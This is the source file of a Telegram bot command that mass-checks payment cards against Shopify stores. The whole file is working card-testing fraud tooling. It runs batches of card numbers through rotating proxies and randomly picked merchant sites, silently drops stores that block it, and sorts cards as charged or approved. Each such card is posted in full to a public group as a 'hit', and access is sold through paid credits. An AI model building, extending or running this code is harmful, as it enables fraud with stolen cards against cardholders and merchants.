"""
gates/shopify/msh.py

Mass Shopify checker (``/msh``) using the new API.

Behaviour
---------
* Cards are checked **sequentially**, one after another.
* After every card a per-card result is posted (charged / approved / declined / error).
* Each card uses a different randomly-picked site + proxy combo.
* A single status message is updated with running totals and a STOP button.
"""

from __future__ import annotations

import asyncio
import logging
import random
import string
import time
from typing import Dict, List

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, CommandHandler, CallbackQueryHandler

from db import get_user, update_user
from config import BOT_USERNAME, PUBLIC_GROUP_ID
from utils.helpers import escape_html

# Concurrency tuning for /msh — parallel like /mrz
MSH_CONCURRENCY = 10
MSH_TIMEOUT = 90
from force_join import force_join
from utils.cards_ui import (
    APPROVED as UI_APPROVED,
    CHARGED as UI_CHARGED,
    DECLINED as UI_DECLINED,
    ERROR as UI_ERROR,
    format_card_result,
    result_buttons as _ui_result_buttons,
)
from utils.mass_progress import render_mass_progress, stop_keyboard
from utils.credits import consume_credit, is_unlimited, add_credits
from utils.plans import user_plan_label

from .common import (
    STATUS_APPROVED,
    STATUS_CHARGED,
    STATUS_DECLINED,
    STATUS_ERROR,
    call_shopify_api,
    classify_response,
    extract_cards_from_text,
    format_gateway_with_price,
    get_proxies_for_user,
    get_user_sites,
    is_site_killed_by,
    pick_random,
    remove_user_site,
)


logger = logging.getLogger(__name__)

_UI_BUCKET = {
    STATUS_CHARGED: UI_CHARGED,
    STATUS_APPROVED: UI_APPROVED,
    STATUS_DECLINED: UI_DECLINED,
    STATUS_ERROR: UI_ERROR,
}


active_mass_checks: Dict[str, dict] = {}


_HIT_STATUS_EMOJI = {
    "charged": ("5041796412954641308", "💎"),
    "approved": ("5125343104638912114", "✅"),
}


def _profile_html(user) -> str:
    name = getattr(user, "first_name", None) or "User"
    if getattr(user, "last_name", None):
        name += f" {user.last_name}"
    return f'<a href="tg://user?id={user.id}">{escape_html(name)}</a>'


def _hit_status_html(status_label: str) -> str:
    eid, fb = _HIT_STATUS_EMOJI.get((status_label or "").strip().lower(), ("", ""))
    safe = escape_html(status_label)
    if eid:
        return f'{safe} <tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
    return safe


async def _send_hit(context, user, card: str, status_label: str, response: str, gateway: str) -> None:
    """Broadcast a successful Shopify hit to the public group."""
    try:
        bot_link = f'<a href="https://t.me/{BOT_USERNAME}">𝘚𝘱𝘢𝘤𝘦 𝘊𝘩𝘬</a>'
        profile = _profile_html(user)
        hit_message = (
            '<tg-emoji emoji-id="5219804923130038865">💎</tg-emoji> '
            '<b>𝑯𝑰𝑻 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅</b> '
            '<tg-emoji emoji-id="4916036072560919511">💎</tg-emoji>\n'
            '━━━━━━━━\n'
            f'𝘜𝘴𝘦𝘳 ➞ {profile}\n'
            f'𝘚𝘵𝘢𝘵𝘶𝘴 ➞ {_hit_status_html(status_label)}\n'
            f'𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ➞ <code>{escape_html(response)}</code>\n'
            f'𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➞ {escape_html(gateway)}\n'
            '━━━━━━━━\n'
            f'𝑯𝑰𝑻 𝑭𝒓𝒐𝒎 ➞ {bot_link}'
        )
        await context.bot.send_message(
            chat_id=PUBLIC_GROUP_ID,
            text=hit_message,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=False,
        )
    except Exception as e:
        logger.warning(f"send_hit (shopify) failed: {e}")


def _session_id() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


def _stop_kb(session_id: str) -> InlineKeyboardMarkup:
    return stop_keyboard(callback_data=f"stop_msh_{session_id}")


async def _process_one(card: str, sites: list, proxies: list, user_id: int, session=None):
    """Try every available site (silently dropping dead/error ones) until we get
    a real charge/approve/decline result for this card."""
    tried = set()
    last_response = None
    last_site = ""
    # Try as many sites as we have. Each killed site is silently removed and
    # the card is automatically retried on a fresh one.
    max_attempts = max(len(sites) + 2, 5)
    for _ in range(max_attempts):
        if not sites:
            break
        # Pick an untried site
        candidates = [s for s in sites if s not in tried]
        if not candidates:
            break
        site = pick_random(candidates)
        if not site:
            break
        tried.add(site)
        proxy = pick_random(proxies) or ""
        api_response = await call_shopify_api(card, site, proxy, timeout=MSH_TIMEOUT, session=session)
        last_response, last_site = api_response, site
        if is_site_killed_by(api_response):
            # silently drop this site for the user and retry on another one
            asyncio.create_task(remove_user_site(user_id, site))
            try:
                sites.remove(site)
            except ValueError:
                pass
            continue
        # also auto-retry on raw transport / API errors
        if api_response.get("raw") is None:
            continue
        return api_response, site
    return last_response, last_site


@force_join
async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    raw = ""
    msg = update.message
    if msg.document:
        try:
            file = await context.bot.get_file(msg.document.file_id)
            raw = (await file.download_as_bytearray()).decode("utf-8", "ignore")
        except Exception as e:
            logger.warning(f"msh: failed to read document: {e}")
    elif msg.reply_to_message and msg.reply_to_message.document:
        try:
            file = await context.bot.get_file(msg.reply_to_message.document.file_id)
            raw = (await file.download_as_bytearray()).decode("utf-8", "ignore")
        except Exception as e:
            logger.warning(f"msh: failed to read replied document: {e}")
    elif msg.reply_to_message and msg.reply_to_message.text:
        raw = msg.reply_to_message.text
    elif context.args:
        raw = " ".join(context.args)

    cards = extract_cards_from_text(raw)
    if not cards:
        await update.message.reply_text(
            "<b>Usage:</b>\n<code>/msh card1 card2 ...</code>\nor reply to a .txt file.",
            parse_mode=ParseMode.HTML,
        )
        return

    sites = await get_user_sites(user_id)
    if not sites:
        await update.message.reply_text(
            "⚠️ <b>𝙉𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙.</b>\n𝘼𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙬𝙞𝙩𝙝 <code>/add</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    proxies = await get_proxies_for_user(user_id)
    if not proxies:
        await update.message.reply_text(
            "❌ <b>𝙉𝙤 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙘𝙤𝙣𝙛𝙞𝙜𝙪𝙧𝙚𝙙.</b>\n𝘼𝙙𝙙 𝙨𝙤𝙢𝙚 𝙬𝙞𝙩𝙝 <code>/addpxy</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    user_data = await get_user(user_id)
    if not user_data or user_data.get("credits", 0) <= 0:
        await update.message.reply_text(
            "❌ 𝙊𝙪𝙩 𝙤𝙛 𝙘𝙧𝙚𝙙𝙞𝙩𝙨.", parse_mode=ParseMode.HTML
        )
        return

    for sid, data in list(active_mass_checks.items()):
        if data.get("user_id") == user_id:
            await update.message.reply_text(
                "⚠️ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙖𝙣 𝙖𝙘𝙩𝙞𝙫𝙚 /𝙢𝙨𝙝 𝙧𝙪𝙣𝙣𝙞𝙣𝙜.",
                parse_mode=ParseMode.HTML,
            )
            return

    session_id = _session_id()
    stop_event = asyncio.Event()
    stats = {
        "checked": 0,
        STATUS_CHARGED: 0,
        STATUS_APPROVED: 0,
        STATUS_DECLINED: 0,
        STATUS_ERROR: 0,
    }
    start_time = time.time()

    status_msg = await update.message.reply_text(
        render_mass_progress(
            gate_name="Shopify",
            total=len(cards),
            checked=0,
            card="-",
            response="-",
            start_time=start_time,
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=_stop_kb(session_id),
    )

    active_mass_checks[session_id] = {
        "user_id": user_id,
        "stop_event": stop_event,
        "message_id": status_msg.message_id,
        "chat_id": status_msg.chat_id,
        "stats": stats,
        "total": len(cards),
        "start_time": start_time,
    }

    # Pre-charge credits for all cards (like /mrz does); unlimited plans skip this
    is_free = is_unlimited(user_id)
    available_credits = int((user_data or {}).get("credits", 0) or 0)
    cards_to_check = cards if is_free else (cards[:available_credits] if available_credits < len(cards) else cards)
    if not cards_to_check:
        await update.message.reply_text("❌ 𝙊𝙪𝙩 𝙤𝙛 𝙘𝙧𝙚𝙙𝙞𝙩𝙨.", parse_mode=ParseMode.HTML)
        active_mass_checks.pop(session_id, None)
        return
    if not is_free and cards_to_check:
        await consume_credit(user_id, len(cards_to_check))
    if len(cards_to_check) < len(cards):
        try:
            await update.message.reply_text(
                f"⚠️ <b>𝙊𝙣𝙡𝙮 {len(cards_to_check)}/{len(cards)} 𝙘𝙖𝙧𝙙𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙</b> — 𝙤𝙪𝙩 𝙤𝙛 𝙘𝙧𝙚𝙙𝙞𝙩𝙨 𝙛𝙤𝙧 𝙩𝙝𝙚 𝙧𝙚𝙨𝙩.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    progress = {"card": "-", "response": "-"}
    progress_lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(MSH_CONCURRENCY)

    connector = aiohttp.TCPConnector(limit=MSH_CONCURRENCY, limit_per_host=MSH_CONCURRENCY)
    timeout_obj = aiohttp.ClientTimeout(total=MSH_TIMEOUT)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout_obj) as http_session:
            async def worker(card: str):
                if stop_event.is_set():
                    return
                async with semaphore:
                    if stop_event.is_set():
                        return
                    api_response, site = await _process_one(
                        card, sites[:], proxies, user_id, session=http_session
                    )

                if api_response is None:
                    response_text = "Error"
                    category = STATUS_ERROR
                    per_card = None
                else:
                    category = classify_response(api_response)
                    response_text = api_response.get("Response") or "-"
                    plan, badge = await user_plan_label(user_id)
                    plan_label = f"{plan} {badge}".strip()
                    per_card = await format_card_result(
                        card=card,
                        gateway=format_gateway_with_price(
                            api_response.get("Gateway", "Shopify Payments"),
                            api_response.get("Price"),
                        ),
                        response=api_response.get("Response", ""),
                        price=api_response.get("Price", "-"),
                        status=_UI_BUCKET.get(category, UI_ERROR),
                        user=update.effective_user,
                        plan_label=plan_label,
                    )

                async with progress_lock:
                    stats[category] = stats.get(category, 0) + 1
                    stats["checked"] += 1
                    progress["card"] = card
                    progress["response"] = response_text

                if per_card is not None and category in (STATUS_CHARGED, STATUS_APPROVED):
                    try:
                        await update.message.reply_text(
                            per_card,
                            parse_mode=ParseMode.HTML,
                            reply_markup=_ui_result_buttons(),
                            disable_web_page_preview=True,
                        )
                    except Exception as e:
                        logger.warning(f"msh: failed sending hit: {e}")
                        # Retry with a plain-text fallback so a Charged/Approved card
                        # is NEVER lost just because the formatted message failed.
                        status_label = "Charged" if category == STATUS_CHARGED else "Approved"
                        fallback = (
                            f"💎 <b>{status_label}</b>\n"
                            f"<code>{escape_html(card)}</code>\n"
                            f"Response: <code>{escape_html(response_text)}</code>"
                        )
                        for attempt in range(3):
                            try:
                                await update.message.reply_text(
                                    fallback, parse_mode=ParseMode.HTML
                                )
                                break
                            except Exception as e2:
                                logger.warning(f"msh: fallback hit send retry {attempt+1} failed: {e2}")
                                await asyncio.sleep(1)
                    status_label = "Charged" if category == STATUS_CHARGED else "Approved"
                    gateway_str = format_gateway_with_price(
                        api_response.get("Gateway", "Shopify Payments"),
                        api_response.get("Price"),
                    )
                    await _send_hit(
                        context,
                        update.effective_user,
                        card,
                        status_label,
                        response_text,
                        gateway_str,
                    )

            async def progress_updater():
                last = -1
                while stats["checked"] < len(cards_to_check) and not stop_event.is_set():
                    await asyncio.sleep(2)
                    if stats["checked"] == last:
                        continue
                    last = stats["checked"]
                    try:
                        await status_msg.edit_text(
                            render_mass_progress(
                                gate_name="Shopify",
                                total=len(cards_to_check),
                                checked=stats["checked"],
                                charged=stats[STATUS_CHARGED],
                                approved=stats[STATUS_APPROVED],
                                declined=stats[STATUS_DECLINED],
                                card=progress["card"],
                                response=progress["response"],
                                start_time=start_time,
                            ),
                            parse_mode=ParseMode.HTML,
                            reply_markup=_stop_kb(session_id),
                        )
                    except Exception:
                        pass

            tasks = [asyncio.create_task(worker(c)) for c in cards_to_check]
            updater_task = asyncio.create_task(progress_updater())

            async def stop_watcher():
                await stop_event.wait()
                for t in tasks:
                    if not t.done():
                        t.cancel()

            watcher_task = asyncio.create_task(stop_watcher())
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            finally:
                updater_task.cancel()
                watcher_task.cancel()
    finally:
        elapsed = time.time() - start_time
        # Refund credits for cards that didn't actually run (e.g. STOP pressed)
        if not is_unlimited(user_id):
            unused = max(0, len(cards_to_check) - int(stats.get("checked", 0)))
            if unused > 0:
                try:
                    await add_credits(user_id, unused)
                except Exception:
                    pass
        try:
            await status_msg.edit_text(
                render_mass_progress(
                    gate_name="Shopify",
                    total=len(cards_to_check),
                    checked=stats["checked"],
                    charged=stats[STATUS_CHARGED],
                    approved=stats[STATUS_APPROVED],
                    declined=stats[STATUS_DECLINED],
                    card="-",
                    response="Complete",
                    elapsed=elapsed,
                    in_progress=False,
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        active_mass_checks.pop(session_id, None)


async def handle_stop_msh_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.data.startswith("stop_msh_"):
        return
    session_id = query.data[len("stop_msh_"):]
    state = active_mass_checks.get(session_id)
    if not state:
        try:
            await query.answer("Session not found.", show_alert=True)
        except Exception:
            pass
        return
    if query.from_user.id != state["user_id"]:
        await query.answer("Only the original user can stop this check.", show_alert=True)
        return
    state["stop_event"].set()
    await query.answer("Stopping…", show_alert=False)


async def _noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        try:
            await query.answer()
        except Exception:
            pass


def register_msh_handlers(application):
    """Register the inline-button callbacks for /msh.

    The /msh command itself is registered via ``main.py`` so it gets the dual
    ``/msh`` and ``.msh`` prefixes from ``add_dual_command``.
    """
    application.add_handler(CallbackQueryHandler(_noop_callback, pattern=r"^noop$"))
    application.add_handler(
        CallbackQueryHandler(handle_stop_msh_callback, pattern=r"^stop_msh_")
    )
    logger.info("✅ Shopify /msh callbacks registered")
